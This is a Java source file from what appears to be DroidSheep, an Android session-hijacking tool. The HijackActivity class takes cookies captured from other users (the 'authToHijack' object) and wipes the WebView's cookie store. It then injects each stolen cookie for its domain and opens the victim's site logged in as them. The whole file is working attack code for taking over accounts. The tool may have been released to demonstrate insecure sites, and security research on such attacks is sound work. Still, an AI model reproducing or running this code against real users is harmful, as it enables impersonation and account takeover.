/*    	HijackActivity.java is the WebView Activity setting up the cookies
    	Copyright (C) 2011 Andreas Koch <koch.trier@gmail.com>
    	
    	This software was supported by the University of Trier 

	    This program is free software; you can redistribute it and/or modify
	    it under the terms of the GNU General Public License as published by
	    the Free Software Foundation; either version 3 of the License, or
	    (at your option) any later version.
	
	    This program is distributed in the hope that it will be useful,
	    but WITHOUT ANY WARRANTY; without even the implied warranty of
	    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	    GNU General Public License for more details.
	
	    You should have received a copy of the GNU General Public License along
	    with this program; if not, write to the Free Software Foundation, Inc.,
	    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. */


package de.trier.infsec.koch.droidsheep.activities;

import org.apache.http.cookie.Cookie;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.Window;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.Toast;
import de.trier.infsec.koch.droidsheep.R;
import de.trier.infsec.koch.droidsheep.auth.Auth;
import de.trier.infsec.koch.droidsheep.objects.CookieWrapper;


public class HijackActivity extends Activity {
	private WebView webview = null;
	private Auth authToHijack = null;

	private class MyWebViewClient extends WebViewClient {
		@Override
		public boolean shouldOverrideUrlLoading(WebView view, String url) {
			view.loadUrl(url);
			return true;
		}
	}

	private void setupCookies() {
		Log.i("FS", "######################## COOKIE SETUP ###############################");
		CookieManager manager = CookieManager.getInstance();
		Log.i("FS", "Cookiemanager has cookies: " + (manager.hasCookies()?"YES":"NO"));
		if (manager.hasCookies()) {			
			manager.removeAllCookie();
			try {Thread.sleep(3000);} catch (InterruptedException e) {}
			Log.i("FS", "Cookiemanager has still cookies: " + (manager.hasCookies()?"YES":"NO"));	
		}
		Log.i("FS", "######################## COOKIE SETUP START ###############################");
		for (CookieWrapper cookieWrapper : authToHijack.getCookies()) {
			Cookie cookie = cookieWrapper.getCookie();
			String cookieString = cookie.getName() + "=" + cookie.getValue() + "; domain=" + cookie.getDomain() + "; Path="
					+ cookie.getPath();
			Log.i("FS", "Setting up cookie: " + cookieString);
			manager.setCookie(cookie.getDomain(), cookieString);
		}
		CookieSyncManager.getInstance().sync();
		Log.i("FS", "######################## COOKIE SETUP DONE ###############################");
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		CookieSyncManager.createInstance(this);
	}
	
	private void setupWebView() {
		webview = new WebView(this);
		webview.setWebViewClient(new MyWebViewClient());
		WebSettings webSettings = webview.getSettings();
		webSettings.setUserAgentString("foo");
		webSettings.setJavaScriptEnabled(true);
		webSettings.setAppCacheEnabled(false);
		webSettings.setBuiltInZoomControls(true);
		webview.setWebChromeClient(new WebChromeClient() {
			public void onProgressChanged(WebView view, int progress) {
				HijackActivity.this.setProgress(progress * 100);
			}
		});
	}

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if ((keyCode == KeyEvent.KEYCODE_BACK) && webview.canGoBack()) {
			webview.goBack();
			return true;
		}
		return super.onKeyDown(keyCode, event);
	}

	//Menü Items
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		super.onCreateOptionsMenu(menu);
		menu.add(0, 0, 0, "BACK");
		menu.add(0, 1, 0, "FORWARD");
		menu.add(1, 2, 0, "RELOAD");
		menu.add(1, 3, 0, "CLOSE");
		return true;
	}

	//Menü Actions
	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		switch (item.getItemId()) {
		case 0:
			if (webview.canGoBack())
				webview.goBack();
			break;
		case 1:
			if (webview.canGoForward())
				webview.goForward();
			break;
		case 2:
			webview.reload();
			break;
		case 3:
			this.finish();
			break;
		}
		return false;
	}

	@Override
	protected void onStart() {
		super.onStart();
		String key = this.getIntent().getExtras().getString("ID");
		this.authToHijack = ListenActivity.authList.get(key);

		if (authToHijack == null) {
			Toast.makeText(this, "Sorry, there was an error loading this Authentication", Toast.LENGTH_LONG).show();
			finish();
			return;
		}

		boolean mobile = this.getIntent().getExtras().getBoolean("MOBILE");
		String url = mobile?authToHijack.getMobileUrl():authToHijack.getUrl();

		setupWebView();
		getWindow().requestFeature(Window.FEATURE_PROGRESS);
		getWindow().requestFeature(Window.FEATURE_PROGRESS);
		setContentView(R.layout.webview);
		LinearLayout layout = (LinearLayout) findViewById(R.id.hijack);
		layout.removeAllViews();
		layout.addView(webview);
		
		setupCookies();
		Log.e("FS", "###################################### LOAD #############################################");
		webview.loadUrl(url);
	}
	
	@Override
	protected void onStop() {
		super.onPause();
		finish();
	}

}